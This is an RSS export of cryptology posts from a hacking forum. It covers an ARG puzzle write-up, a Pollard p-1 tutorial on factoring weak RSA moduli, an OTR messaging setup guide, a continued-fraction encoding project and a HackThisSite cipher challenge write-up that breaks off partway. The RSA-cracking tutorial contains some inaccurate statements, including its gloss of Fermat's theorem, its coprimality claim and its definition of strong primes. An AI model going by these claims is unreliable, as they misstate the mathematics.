<p>Ok, so this one got my attention since I entered the site, because you can hear in the first part of the song some strange “satanic” like voices. <em>(or it’s just my mind that hears that. I’M FINE OK!?)</em><br>
I popped up audacity ,after installing it, and started playing with the audio. It didn’t seem to be something odd in the first place.<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/7/70b4a603df2636848d11932330977c26b9ddb7a6.png" alt="audacity1" data-base62-sha1="g52vT0hIVtEyVsXhOaTFxzZK1oi" width="690" height="173"></p>
<p>But take a closer look…</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/6/680a1bfecb93411bd59add4f5d0b2335658013de.png" alt="audacity2" data-base62-sha1="eQnjBb3040ZBCc0sCoRPYmaExlA" width="559" height="300"><br>
If you listen to it to, in the first 30-40 seconds the song it’s not started yet and those “satanic” voices are actually what we see here, in audacity. Maybe it’s there on purpose.</p>
<p>So… we got something, but what can we do with it…?<br>
I tried to reverse the audio, change its speed, research on hiding messages in audio files, with the hope that something might pop up, but… unfortunately, I got nothing.</p>
<p>In this moment, I started looking again at everything and analyze it more carefully than I have done before. After a few hours I found out that when you reverse it, the voices start to have more sense.<br>
Then just made some speed adjustments, some coffee and finally got something.<br>
Those “satanic” voices were just a robot who tells the next onion link for the puzzle.</p>
<p><em><strong>By the way:</strong></em>  <em>this part was very struggling because the robots voice is really hard to hear and got a hard time getting what the link was. But hey, got it in the end.</em><img src="https://0x00sec.org/images/emoji/twitter/face_with_monocle.png?v=9" title=":face_with_monocle:" class="emoji only-emoji" alt=":face_with_monocle:"></p>
<p>The link was: <span class="spoiler"><a href="https://0x00sec.org/t/arg-the-red-triangle-solving-part2/7368/1">spoiler</a></span><br>
<em>At the moment the links are down, as far as I saw…</em></p>
<h1>Conclusion</h1>
<p>That was a new territory for me and had a lot of fun solving these puzzles.<br>
Hope you guys loved it as much as I love making those articles and more importantly, I hope that you had fun.<br>
Looking forward to see if you find something in the Fibonacci image and also hope you see in the next one.<br>
Thanks for reading ! <img src="https://0x00sec.org/images/emoji/twitter/grin.png?v=9" title=":grin:" class="emoji" alt=":grin:"></p>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/arg-the-red-triangle-solving-part2/7368">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/arg-the-red-triangle-solving-part2/7368</link>
          <pubDate>Tue, 03 Jul 2018 01:39:27 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-7368</guid>
          <source url="https://0x00sec.org/t/arg-the-red-triangle-solving-part2/7368.rss">[ARG] The Red Triangle Solving -- Part2</source>
        </item>
        <item>
          <title>[ARG] The Red Triangle Solving --- Part 1</title>
          <dc:creator><![CDATA[404Err0r]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>Hello fellow nerds, today I have decided to write a little article about my journey in resolving the <a href="http://7zzhplvtai2jauiw.onion/" rel="noopener nofollow ugc">Red Triangle</a> ARG. So here we are !</p>
<h1>Getting started</h1>
<p>Once you open the link you are prompted with a Red triangle on top, some hex encoded text below, a nice music played and 3 images:</p>
<ul>
<li>Two of them have some weird looking symbols</li>
<li>And the last one have some Roman numerals</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/0f210c04b56a6798a2ab436669dbd40c63978178.jpg" alt="Untitled" data-base62-sha1="29PXOK9aUWgj7zPhhsNMojhbeAM" width="631" height="500"></p>
<h1>Hex encoded Text</h1>
<p>I started with decoding the hex and got the following:<br>
<strong>A God may walk among mankind, but mankind may never walk among the Gods.The journey you seek can only be discovered by those who are capable of withholding such knowledge. Be wary of your surroundings, not everything you expect is to be expected.Only The Most Intelligent Advance Forward</strong><br>
Ok, just the basic story that you would expect for every ARG.</p>
<h1>Images</h1>
<p>Moving forward, I have downloaded the images and the audio that plays in the background. But, I really was very curious about the 2 images with the strange symbols so I started to look closer to them. Taking a look at the metadata, with the hope that I could get something out of it but ,unfortunately, found nothing.</p>
<p><em>(I know, I could also look if it is some hidden data in the images, but I have thought that if no metadata is present maybe the creator doesn’t focused on those parts and more on the symbols)</em></p>
<p>After a few minutes, I have noticed that in the first image are 5 symbols and then <strong>://</strong>. Hmm… this looks like a https URL, so I have assumed that the  first symbol is a <strong>H</strong> , the <strong>&gt;</strong> symbol is a <strong>T</strong> and so on.</p>
<p>Thus, resulting this part:<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/d/db5056a91f7a358bff57516061a8f4a1fab4c6e4.jpg" alt="1" data-base62-sha1="vi8GOjLn7EcEBRQrf8lBTnjLypS" width="183" height="54">     - - - - - - - - - - - - - - - - - &gt;     HTTPS</p>
<p>Now have a look at the other part:<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/e/ee095f3b26b3d57e0f780a1ea783704a650eb9a4.png" alt="2" data-base62-sha1="xXLItASFKgoxTmQvHVoyN21EryI" width="298" height="345"><br>
This sequence have 2 dots, which I assume:</p>
<ul>
<li>The first 4 symbols translates to a subdomain</li>
<li>The next 6 are the domain itself</li>
<li>The next 3 are the top level domain.</li>
</ul>
<p>I just assumed, that the top level domain is <em>.com</em>.<br>
(I know it could be <em>.org</em> or others like that… but hey, that’s why it’s called an assumption)</p>
<p>Now we have another 3 symbols to work with:<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/b/b40ff69a57e88b278a6101f07610ad8c68bce105.png" alt="3" data-base62-sha1="pGU92KGBxl7WPAN2QdPaZByPSFn" width="166" height="59"> - - - - - - - - - - - - - - - - - &gt;     .COM</p>
<p>If we look at the subdomain , you should see that we almost have all the symbols for it, we just don’t know the first one, but let’s just replace them.Resulting in : <strong>?ocs</strong>.</p>
<p>Hmm… I need a subdomain that terminates in ocs… My first thought when thinking about this was docs so I assumed ,again, that it’s correct.<br>
After replacing the others symbols that we know in the main domain we have: <strong><a href="https://docs" rel="noopener nofollow ugc">https://docs</a>.?oo???.com</strong></p>
<p>First thing that popped into my head when I was staring at this was <strong><a href="http://docs.google.com" rel="noopener nofollow ugc">docs.google.com</a></strong>, because google have a subdomain docs and also fits perfectly with what I have missing.</p>
<p>Let’s recap what we have until now:<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/8/8c37b1ff8bc5ac44548cbf38da45a0556d5a6cd4.jpg" alt="4" data-base62-sha1="k0qaH6HOuhvcrX6ipfixzLkSwi8" width="409" height="227"> - - - - - - - - - - - - &gt; <a href="https://docs.google.com" rel="noopener nofollow ugc">https://docs.google.com</a></p>
<p>I tried replacing all the other symbols that I know with what was left, but got nothing… Because I didn’t know a lot of the symbols.<br>
At this point, I got stuck and started thinking that I was going on the wrong path. After hours of stretching my brain , I started browsing the internet for this alphabet and found this:</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/b/bbfce3d9f78aec874a681f69e1c6d43f8d607a63.jpg" alt="5" data-base62-sha1="qP16hLsZP4D2V4wGVmL0bDpEGav" width="530" height="500"></p>
<p>Translating the 2 images concatenated together we get this URL : <a href="https://docs.google.com/document/d/19SPOqsg1kFiy0s3KgnUo0zq6xqqfV0opDZ1GKd2vMbw/edit" rel="noopener nofollow ugc">https://docs.google.com/document/d/19SPOqsg1kFiy0s3KgnUo0zq6xqqfV0opDZ1GKd2vMbw/edit</a> which has the red triangle symbol and underneath the next link to the puzzle: <span class="spoiler"><a href="https://0x00sec.org/t/arg-the-red-triangle-solving-part-1/7272/1">spoiler</a></span></p>
<p>I was happy and sad at the same time, because I wanted to manage to do this one by myself without internet support , but I still got the symbols right tho <img src="https://0x00sec.org/images/emoji/twitter/smirk_cat.png?v=9" title=":smirk_cat:" class="emoji" alt=":smirk_cat:">.</p>
<h1>Audio File</h1>
<p>I tried to see if it is something in the audio file as well, but found nothing. <img src="https://0x00sec.org/images/emoji/twitter/crying_cat_face.png?v=9" title=":crying_cat_face:" class="emoji" alt=":crying_cat_face:"></p>
<h1>Conclusion</h1>
<p>This was a very amazing experience for me and hope you guys liked it.<br>
Looking forward to continue this series if you support it and want more.<br>
Thanks for your time and hope I see you in the next one.<br>
I’m out !</p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/arg-the-red-triangle-solving-part-1/7272">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/arg-the-red-triangle-solving-part-1/7272</link>
          <pubDate>Tue, 26 Jun 2018 18:37:02 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-7272</guid>
          <source url="https://0x00sec.org/t/arg-the-red-triangle-solving-part-1/7272.rss">[ARG] The Red Triangle Solving --- Part 1</source>
        </item>
        <item>
          <title>Breaking non-ANSI RSA with Pollard&#39;s algorithm</title>
          <dc:creator><![CDATA[Silur]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <h1>WTF is RFC5114?</h1>
<p>We all know the importance of large prime numbers in cryptography, given that <code>n = pq</code> form large numbers’ prime factorization requires an unreachable amount of computational resources.<br>
But why is this RFC enforces a secure DH group (used not just in crypto, but zeroknowledge systems too like FFS or Chaum-Pedersen) and the ANSI-RSA standard requires “strong” primes on top of this? (there is a dispute on this, more below)</p>
<p>So as you already know, RSA begins with finding a modulus N by multiplying two large primes.<br>
But we all know that modulo algebra is a really friendly area in math, given that the modulo is an equivalence-relation, so we can do almost any kind of magic with it without breaking the result.<br>
There are several examples of these magics for eg Fermats-little theorem which states that if a number n is congruent to 1 modulo a factor of n, then the gcd(x − 1, n) will be divisible by that factor.</p>
<p>John Pollard came up with a special-usecase prime factorization like this called <code>p-1</code> that uses this magic. It happens that the current RSA “rules” we define is enough for that special usecase.</p>
<p>The algo is defined like this (actual example is from wikipedia):</p>
<p>We want to get the prime factorization of 299</p>
<ul>
<li>First we get a number called a “smooth bound” to 299<br>
A smooth number  is a concept written down by Leonard Adleman, it means that number X is Y-bound if neither of X’s prime factors are greater than Y.<br>
Let this number be <code>5</code> for start.</li>
<li>Then we multiply the floor of all primes on the power of <code>log_p(n)</code> smaller than our smooth bound<br>
Formally <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/5aeddb3e83515dbe572b109415216f87eb8ff890" alt="" width="21" height="5"><br>
We selected the bound <code>5</code>, the primes up to 5 are <code>[2,3,5]</code><br>
<code>floor(log2(299)) = 8</code><br>
<code>floor(log3(299)) = 5</code><br>
<code>floor(log5(299)) = 3</code><br>
So our equation is: <code>M = 2^8 * 3^5 * 5^3</code>
</li>
<li>Then we select a random coprime <code>a</code> to <code>n</code> (so that GCD(a,n) == 1, you can use the euclidean algo here), let this be 2. I recommend using always 2 for IRL RSA cracking since 2 will be always a coprime (as any other integer) and it’s faster to operate on powers of 2 on a CPU.</li>
<li>We search for <code>GCD(a^m -1 ,n)</code> which is 13<br>
If the result is 1 so <code>(a^m)-1</code> is also a coprime, we select a larger bound and restart<br>
If the result is n we need a smaller bound and restart<br>
13 is smaller than N and larger than 1 so this is our solution.<br>
299/13 = 23 which is a prime so we are over with the factorization now.</li>
</ul>
<p>So as you may get the overall idea now, since we won’t have an easy job with large primes we’ll need this procedure several times for a full factorization.<br>
There’s an efficient mature implementation of p-1 and also several factorization algos here: <a href="https://gforge.inria.fr/forum/forum.php?forum_id=11510" rel="nofollow noopener">https://gforge.inria.fr/forum/forum.php?forum_id=11510</a></p>
<h3>The solution</h3>
<p>Safe primes are primes in the form 2p+1 where p is a prime too. Because the p-1 algorithms efficiency depends on not p’s but p-1’s prime factorization, if you satisfy this dependency it implies that an attacker cannot select a smooth parameter easily (as it’s proven that if q=2p+1 then q-1 will have a large factor).<br>
Strong primes takes this even further, these are primes <code>p</code>  that have a property that it’s greater then the arithmetic mean of it’s neighbor primes. Formally <code>p_n &gt; (p_(n-1) + p_(n+1)) / 2</code>. We need these because Pollard came up with a +1 and even a Rho factorization algorithm later <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<h3>The case with ANSI and stuff</h3>
<p>So you may feel like to destroy all your 4096-bit keys but remember that this algo still has a bottleneck on runtime O(B*log(B)*log^2(n)), so if you have to increase B several times you’ve fallen into the “computationally infeasible to crack” pitfall again. But this is no explanation so the ANSI-RSA standard required strong primes to be used with implementations<br>
<strong>However</strong><br>
Even more efficient factorization algorithms showed up (tutorials on those later) so several other “standards” (famous xkcd here) advised that using strong primes is just an overhead for they can’t provide security against the newest weapons.</p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/breaking-non-ansi-rsa-with-pollards-algorithm/3410">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/breaking-non-ansi-rsa-with-pollards-algorithm/3410</link>
          <pubDate>Fri, 25 Aug 2017 19:22:40 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-3410</guid>
          <source url="https://0x00sec.org/t/breaking-non-ansi-rsa-with-pollards-algorithm/3410.rss">Breaking non-ANSI RSA with Pollard&#39;s algorithm</source>
        </item>
        <item>
          <title>Jabber + OTR: Theory and Practice</title>
          <dc:creator><![CDATA[afiskon]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>Hello,</p>
<p>Apparently I’ve drink too much coffee today and being high decided to configure Jabber + OTR. In case you are interested in secure instant messaging and want to chat about programming, hardware, security and stuff, feel free to add me to your contact list:</p>
<pre><code class="lang-nohighlight">afiskon@jabber.ru
9AE9C07A 963B06AD 4D585C96 7DCEE589 55599F36
</code></pre>
<p>In case you’ve never heard about OTR here is some theory:</p>
<p></p><aside class="onebox wikipedia">
  <header class="source">
      <a href="https://en.wikipedia.org/wiki/Off-the-Record_Messaging" target="_blank" rel="noopener nofollow ugc">en.wikipedia.org</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:220/202;"><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/89d7ad428fa356a1e190f746233f43613cb33b5d.png" class="thumbnail" width="220" height="202"></div>

<h3><a href="https://en.wikipedia.org/wiki/Off-the-Record_Messaging" target="_blank" rel="noopener nofollow ugc">Off-the-Record Messaging</a></h3>

<p>
Off-the-Record Messaging (OTR) is a cryptographic protocol that provides encryption for instant messaging conversations. OTR uses a combination of AES symmetric-key algorithm with 128 bits key length, the Diffie–Hellman key exchange with 1536 bits group size, and the SHA-1 hash function. In addition to authentication and encryption, OTR provides forward secrecy and malleable encryption.
 The primary motivation behind the protocol was providing deniable authentication for the conversation partici...</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox wikipedia">
  <header class="source">
      <a href="https://en.wikipedia.org/wiki/Forward_secrecy" target="_blank" rel="noopener nofollow ugc">en.wikipedia.org</a>
  </header>
  <article class="onebox-body">
    

<h3><a href="https://en.wikipedia.org/wiki/Forward_secrecy" target="_blank" rel="noopener nofollow ugc">Forward secrecy</a></h3>

<p>In cryptography, forward secrecy (FS), also known as perfect forward secrecy (PFS), is a feature of specific key agreement protocols that gives assurances that session keys will not be compromised even if long-term secrets used in the session key exchange are compromised. For HTTPS the long-term secret is typically the private signing key of the server. Forward secrecy protects past sessions against future compromises of keys or passwords. By generating a unique session key for every session a us...</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p></p>
<p>Regarding practice - many Jabber clients support OTR. I personally use Psi+ but Pidgin will do as well.</p>
<p>On Ubuntu:</p>
<pre><code class="lang-bash">sudo apt-get install psi-plus psi-plus-plugins
</code></pre>
<p>On Arch Linux:</p>
<pre><code class="lang-bash">yaourt -S psi-plus-qt5-git psi-plus-plugins-qt5-git
</code></pre>
<p>After installing Psi+ with plugins just register on any Jabber server you prefer, enable the OTR plugin and generate a key.</p>
<p>There are also some decent mobile clients, e.g. ChatSecure for iOS and Xabber for Android.</p>
<p>Please note that OTR requires to verify fingerprints of all your contacts manually (could be done in plugin settings). Otherwise a MITM attack could be performed.</p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/jabber-otr-theory-and-practice/3315">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/jabber-otr-theory-and-practice/3315</link>
          <pubDate>Tue, 15 Aug 2017 11:52:37 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-3315</guid>
          <source url="https://0x00sec.org/t/jabber-otr-theory-and-practice/3315.rss">Jabber + OTR: Theory and Practice</source>
        </item>
        <item>
          <title>How to identify type of hashing/encoding algorithm used</title>
          <dc:creator><![CDATA[hkh4cks]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>Is there a way to identify which type of hashing algorithm is used just by looking at the hash value?</p>
<p>Plus I have the same question about encoding techniques. Is it possible to identify which encoding technique is used to encode a particular string?</p>
<p>If there’s a way, I would like to know how it can be done.</p>
            <p><small>7 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-to-identify-type-of-hashing-encoding-algorithm-used/3314">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-to-identify-type-of-hashing-encoding-algorithm-used/3314</link>
          <pubDate>Tue, 15 Aug 2017 10:59:53 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-3314</guid>
          <source url="https://0x00sec.org/t/how-to-identify-type-of-hashing-encoding-algorithm-used/3314.rss">How to identify type of hashing/encoding algorithm used</source>
        </item>
        <item>
          <title>Continued Fraction Data Encoding</title>
          <dc:creator><![CDATA[Emparetiw_Aparajdm]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p><span class="hashtag">#Continued</span> Fraction Data Encoding<br>
I’m learning to program and some time ago while thinking about a new project I came up with an idea to use continued fraction as an method to encode data that would produce unique result each time even if the input was always the same.</p>
<p>I would like to hear your thoughts about this idea and implementation of it. I suspect that it may be an unoriginal idea but I don’t know of any sources that mention it.</p>
<h4>Required Skills</h4>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Continued_fraction" rel="noopener nofollow ugc">https://en.wikipedia.org/wiki/Continued_fraction</a></li>
<li>C language when looking at the code</li>
<li>Makefile, git, gcc when compiling the sources</li>
<li>Installing required development library (command bellow should work most of the time)<br>
<code>sudo apt install libgmp-dev</code>
</li>
</ul>
<p>#<span class="hashtag">#Idea</span><br>
Interpret bytes of data as a big number which will be a nominator then add random denominator and write it in the continued fraction form.<br>
<strong>Example</strong><br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/9/92781a413a393b9d83778ee4cf08b54ba75af2f3.png" width="" height=""></p>
<p>It is simple example and it doesn’t work in this form for arbitrary binary files.<br>
#<span class="hashtag">#Implementation</span><br>
To make it work for any binary file two things were required:</p>
<ul>
<li>
<p>Append random prefix to nominator to preserve any leading zero digits. I appended 20 digit long random prefix and postfix to nominator.</p>
</li>
<li>
<p>Calculate and preserve greatest common denominator for nominator and denominator because when decoding from the continued fraction format, the fraction is in the simplest form</p>
</li>
<li>
<p>When nominator is being generated during the encoding phase in encoder_generate_number() function then the numbers that are the part of it are zero padded 3 digits long (000, 001, …, 255). It allows to distinguish where they begin and end in the sequence.</p>
</li>
</ul>
<p>Data is encoded in chunks of 1000 bytes long and saved in format “0 x y 0 x y …” where 0 marks the beginning of the encoded sequence of bytes, x is greatest common denominator and y is encoded sequence.<br>
Here is this project implemented in C<br>
<a href="https://github.com/Rit-Onri-Momari/continued-fraction-codec" class="onebox" target="_blank" rel="noopener nofollow ugc">https://github.com/Rit-Onri-Momari/continued-fraction-codec</a></p>
<p>And here is example of some encoded string:<br>
<code>0 1 0 2977814 2 2 3 34 1 5 2 5 8 4 3 2 1 11 6 3 28 2 1 1 57 3 4 2 3 2 2 2 2 1 91 1 5 12 25 3 2 1 9 5 3 7 2 7 2 1 39 1 1 1 1 63 3 1 2 3 1 1 3 2 1 1 4 2 1 1 2 4 1 1 1 18 1 1 1 3 3 1 5 1 17 1 1 194 2 2 16 53 4 2 3 3 6 15 1 1 3 46 1 2 3 1 1 3 68 6 2 2 1 1 1 2 54 1 3 1 1 20 1 1 3 1 4 1 3 1 10 7 3 1 1 1 4 1 1 1 1 3 1 1 2 5 2 1 3 1 2 1 8 3 </code><br>
Here the same string encoded again:<br>
<code>0 4 0 17051 1 2 2 1 5 1 1 6 3 1 3 1 1 1 1 1 9 1 5 23 3 2 7 3 2 1 3 30 1 1 4 1 2 3 1 3 2 1 4 3 2 6 3 10 2 8 2 6 1 2 2 7 2 7 2 21 2 2 9 2 6 4 1 4 2 4 2 1 1 1 1 142 1 1 2 1 16 1 14 1 1 14 1 1 13 7 3 1 1 2 2 2 2 4 2 2 4 1 1 4 4 4 12 42 1 2 6 1 3 1 6 1 30 1 1 8 1 2 9 1 1 2 1 1 3 12 1 1 1 3 1 2 1 3 1 5 5 2 2 1 2 1 10 6 1 1 1 3 8 1 76 5 1 2 3 4 1 3 1 9 1 7 </code></p>
<p>#<span class="hashtag">#Drawbacks</span><br>
Encoded file is very large compared to the original. In this implementation it is about ~12.7 times larger.</p>
<p>#<span class="hashtag">#Conclusion</span><br>
Unfortunately I don’t have any idea for a use case for this encoding.</p>
            <p><small>18 posts - 9 participants</small></p>
            <p><a href="https://0x00sec.org/t/continued-fraction-data-encoding/3108">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/continued-fraction-data-encoding/3108</link>
          <pubDate>Mon, 31 Jul 2017 04:12:14 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-3108</guid>
          <source url="https://0x00sec.org/t/continued-fraction-data-encoding/3108.rss">Continued Fraction Data Encoding</source>
        </item>
        <item>
          <title>Magnet link for every crackme off of crackmes.de</title>
          <dc:creator><![CDATA[GreyGod]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>SSBnYXZlIGEgY3J5IG9mIGFzdG9uaXNobWVudC4gSSBzYXcgYW5kIHRob3VnaHQgbm90aGluZyBvZiB0aGUgb3RoZXIgZm91ciBNYXJ0aWFuIG1vbnN0ZXJzOyBteSBhdHRlbnRpb24gd2FzIHJpdmV0ZWQgdXBvbiB0aGUgbmVhcmVyIGluY2lkZW50LiBTaW11bHRhbmVvdXNseSB0d28gb3RoZXIgc2hlbGxzIGJ1cnN0IGluIHRoZSBhaXIgbmVhciB0aGUgYm9keSBhcyB0aGUgaG9vZCB0d2lzdGVkIHJvdW5kIGluIHRpbWUgdG8gcmVjZWl2ZSwgYnV0IG5vdCBpbiB0aW1lIHRvIGRvZGdlLCB0aGUgZm91cnRoIHNoZWxsLg==</p>
            <p><small>4 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/magnet-link-for-every-crackme-off-of-crackmes-de/2462">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/magnet-link-for-every-crackme-off-of-crackmes-de/2462</link>
          <pubDate>Mon, 19 Jun 2017 03:06:32 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-2462</guid>
          <source url="https://0x00sec.org/t/magnet-link-for-every-crackme-off-of-crackmes-de/2462.rss">Magnet link for every crackme off of crackmes.de</source>
        </item>
        <item>
          <title>Virtual Lorenz Machine</title>
          <dc:creator><![CDATA[fraq]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <p>If you’re like me, you like to see the pins in a tumbler as the key slides into the barrel of the lock. No, that’s not a sexual innuendo. It’s just plain cool to see the inner workings of a complex machine.</p>
<p>There’s just such a thing for crypto enthusiasts in the form of a virtual Lorenz machine. Here is the link, courtesy of CptDateGrape on IRC: <a href="http://www.lorenz.virtualcolossus.co.uk/LorenzSZ/" rel="nofollow noopener">http://www.lorenz.virtualcolossus.co.uk/LorenzSZ/</a></p>
<p>More info on the Lorenz cipher here: <a href="https://en.wikipedia.org/wiki/Lorenz_cipher" rel="nofollow noopener">https://en.wikipedia.org/wiki/Lorenz_cipher</a></p>
            <p><small>2 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/virtual-lorenz-machine/2042">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/virtual-lorenz-machine/2042</link>
          <pubDate>Tue, 16 May 2017 13:21:18 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-2042</guid>
          <source url="https://0x00sec.org/t/virtual-lorenz-machine/2042.rss">Virtual Lorenz Machine</source>
        </item>
        <item>
          <title>HTS.org R6 challenge</title>
          <dc:creator><![CDATA[ricksanchez]]></dc:creator>
          <category>Cryptology</category>
          <description><![CDATA[
            <h1>Preface</h1>
<p>I stated my reasoning behind this article series in the first article which can be found <a href="https://0x00sec.org/t/hts-org-r1-challenge/">here</a>.<br>
To avoid redundancy please check out the preface over there and let’s get right into action!</p>
<p><em><strong>note:</strong></em> If I write non sense in this and the next following articles please correct me for the sake of me and others not getting confused and mixed up with things <img src="/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> .</p>
<h4>Author Assigned Level: Wannabe</h4>
<h4>Community Assigned Level:</h4>
<p><a href="https://0x00sec.org/t/hts-org-r6-challenge/2001/1">Click to view the poll.</a></p>
<h4>Required Skills</h4>
<p>Since we’re starting at the beginning not much knowledge is required at the moment.</p>
<ul>
<li>ascii encoding</li>
<li>basic knowledge about cryptography</li>
<li>endurance!</li>
</ul>
<h4>Disclaimer</h4>
<p>These write ups are only my 2 cents on the challenges. So don’t take them too seriously. <img src="/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<hr>
<h1>
<a href="http://HTS.org">HTS.org</a> realistic challenges</h1>
<h3><a href="https://www.hackthissite.org/missions/realistic/6/">Realistic challenge 6</a></h3>
<h4>Message:</h4>
<blockquote>
<p>Hello esteemed hacker, I hope you have some decent cryptography skills. I have some text I need decrypted.<br>
I work for this company called ToxiCo Industrial Chemicals, which has recently come under fire because of the toxic chemicals we are dumping into the river nearby. Ecological inspectors have reported no problems, but it is widely speculated that they were paid off by ToxiCo management because the water pollution near the ToxiCo factory has always been a serious and widely publicized issue.<br>
I have done some packet sniffing on my network and I have recovered this email that was sent from the CEO of the company to Chief Ecological Inspector Samuel Smith. However, it is encrypted and I cannot seem to decode it using any of my basic decryption tools. I have narrowed it down to the algorithm used to encrypt it, but it is beyond my scope. I was hoping you can take a look at it.<br>
Please check it out.<br>
If you can unscramble it and reply to this message with the original text, it would be much appreciated. Thank you.</p>
</blockquote>
<h4>What can we extract from the message?</h4>
<ul>
<li>We have an encrypted email</li>
<li>We have the used algorithm!</li>
</ul>
<h3>The site:</h3>
<p>The algorithm site is just a simple two text box interface where you can type a message, choose a password and get the encrypted text of it. So we have to manually identify the underlying crypto mechanics…</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/35be2dedc000eb0dc9c1e0db2a64167523939e10.png" width="371" height="253"></p>
<h3>The source</h3>
<p>Not much to see here this time around. Just some boring html code with a encrypt.php script, but nothing we can access or manipulate. So no posting of any source here. Won’t contribute anything to solving the challenge <img src="/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<h3>The cipher</h3>
<blockquote>
<p>.296.294.255.268.313.278.311.270.290.305.322.252.276.286.301.305.264.301.251.269.274.311.304.230.280.264.327.301.301.265.287.285.306.265.282.319.235.262.278.249.239.284.237.249.289.250.282.240.256.287.303.310.314.242.302.289.268.315.264.293.261.298.310.242.253.299.278.272.333.272.295.306.276.317.286.250.272.272.274.282.308.262.285.326.321.285.270.270.241.283.305.319.246.263.311.299.295.315.263.304.279.286.286.299.282.285.289.298.277.292.296.282.267.245.304.322.252.265.313.288.310.281.272.266.243.285.309.295.269.295.308.275.316.267.283.311.300.252.270.318.288.266.276.252.313.280.288.258.272.329.321.291.271.279.250.265.261.293.319.309.303.260.266.291.237.299.286.293.279.267.320.290.265.308.278.239.277.314.300.253.274.309.289.280.279.302.307.317.252.261.291.311.268.262.329.312.271.294.291.291.281.282.292.288.240.248.306.277.298.295.267.312.284.265.294.321.260.293.310.300.307.263.304.297.276.262.291.241.284.312.277.276.265.323.280.257.257.303.320.255.291.292.290.270.267.345.264.291.312.295.269.297.280.290.224.308.313.240.308.311.247.284.311.268.289.266.316.299.269.299.298.265.298.262.260.337.320.285.265.273.307.297.282.287.225.302.277.288.284.310.278.255.263.276.283.322.273.300.264.302.312.289.262.236.278.280.286.292.298.296.313.258.300.280.300.260.274.329.288.272.316.256.259.279.297.296.283.273.286.320.287.313.272.301.311.260.302.261.304.280.264.328.259.259.347.245.291.258.289.270.300.301.318.251.305.278.290.311.280.281.293.313.259.300.262.315.263.319.285.282.297.283.290.293.280.237.234.323.289.305.279.314.274.291.309.273.294.249.283.262.271.286.310.305.306.261.298.